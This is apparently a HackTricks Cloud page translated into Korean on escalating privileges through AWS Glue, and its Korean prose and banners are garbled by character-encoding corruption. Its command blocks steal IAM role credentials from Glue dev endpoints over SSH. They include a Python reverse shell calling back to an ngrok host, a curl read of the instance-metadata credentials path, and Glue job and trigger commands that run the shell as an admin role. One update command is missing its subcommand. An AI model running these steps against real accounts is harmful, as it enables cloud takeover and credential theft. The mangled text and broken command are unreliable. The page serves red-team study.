# AWS - Glue ê¶Œí•œ ìƒìŠ¹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## glue

### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

ì´ ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” **ìƒˆë¡œìš´ AWS Glue ê°œë°œ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì„¤ì •**í•˜ê³ , ì´ ì—”ë“œí¬ì¸íŠ¸ì— **íŠ¹ì • ê¶Œí•œì„ ê°€ì§„ ê¸°ì¡´ ì„œë¹„ìŠ¤ ì—­í• **ì„ í• ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì„¤ì • í›„, **ê³µê²©ìëŠ” ì—”ë“œí¬ì¸íŠ¸ì˜ ì¸ìŠ¤í„´ìŠ¤ì— SSHë¡œ ì ‘ì†**í•˜ì—¬ í• ë‹¹ëœ ì—­í• ì˜ IAM ìê²© ì¦ëª…ì„ ë„ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# Create endpoint
aws glue create-dev-endpoint --endpoint-name <endpoint-name> \
--role-arn <arn-role> \
--public-key file:///ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
ì€ë‹‰ì„ ìœ„í•´ Glue ê°€ìƒ ë¨¸ì‹  ë‚´ì—ì„œ IAM ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ Glue ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ê¶Œí•œ ìƒìŠ¹.

### `glue:UpdateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

ì´ ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” **ê¸°ì¡´ì˜ Glue ê°œë°œ** ì—”ë“œí¬ì¸íŠ¸ì˜ SSH í‚¤ë¥¼ **ë³€ê²½í•˜ì—¬ SSH ì•¡ì„¸ìŠ¤ë¥¼ í™œì„±í™”**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì—”ë“œí¬ì¸íŠ¸ì— ì—°ê²°ëœ ì—­í• ì˜ ê¶Œí•œìœ¼ë¡œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# Change public key to connect
aws glue --endpoint-name target_endpoint \
--public-key file:///ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
**ì ì¬ì  ì˜í–¥:** ì‚¬ìš©ëœ glue ì„œë¹„ìŠ¤ ì—­í• ì— ëŒ€í•œ ê¶Œí•œ ìƒìŠ¹

### `iam:PassRole`, (`glue:CreateJob` | `glue:UpdateJob`), (`glue:StartJobRun` | `glue:CreateTrigger`)

**`iam:PassRole`**ê³¼ **`glue:CreateJob` ë˜ëŠ” `glue:UpdateJob`** ì¤‘ í•˜ë‚˜, ê·¸ë¦¬ê³  **`glue:StartJobRun` ë˜ëŠ” `glue:CreateTrigger`** ì¤‘ í•˜ë‚˜ë¥¼ í•¨ê»˜ ê°€ì§„ ì‚¬ìš©ìëŠ” **AWS Glue ì‘ì—…ì„ ìƒì„±í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸**í•  ìˆ˜ ìˆìœ¼ë©°, ì„ì˜ì˜ **Glue ì„œë¹„ìŠ¤ ê³„ì •**ì„ ì²¨ë¶€í•˜ê³  ì‘ì—…ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ì—…ì€ ì„ì˜ì˜ Python ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ í¬í•¨í•˜ê³  ìˆìœ¼ë©°, ì´ë¥¼ ì•…ìš©í•˜ì—¬ ì—­ë°©í–¥ ì‰˜ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì—­ë°©í–¥ ì‰˜ì€ Glue ì‘ì—…ì— ì²¨ë¶€ëœ ì—­í• ì˜ **IAM ìê²© ì¦ëª…**ì„ ìœ ì¶œì‹œí‚¬ ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ ì—­í• ì˜ ê¶Œí•œì— ë”°ë¼ ì ì¬ì ìœ¼ë¡œ ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ ë˜ëŠ” ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Content of the python script saved in s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#To get the IAM Role creds run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# A Glue role with admin access was created
aws glue create-job \
--name privesctest \
--role arn:aws:iam::93424712358:role/GlueAdmin \
--command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# You can directly start the job
aws glue start-job-run --job-name privesctest
# Or you can create a trigger to start it
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
--actions '[{"JobName": "privesctest"}]' --start-on-creation \
--schedule "0/5 * * * * *"  #Every 5mins, feel free to change
```
**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ Glue ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ê¶Œí•œ ìƒìŠ¹

### `glue:UpdateJob`

ì—…ë°ì´íŠ¸ ê¶Œí•œë§Œìœ¼ë¡œë„ ê³µê²©ìëŠ” ì´ë¯¸ ì—°ê²°ëœ ì—­í• ì˜ IAM ìê²© ì¦ëª…ì„ ë„ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì ì¬ì  ì˜í–¥:** ì—°ê²°ëœ Glue ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ê¶Œí•œ ìƒìŠ¹

## ì°¸ê³  ìë£Œ

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
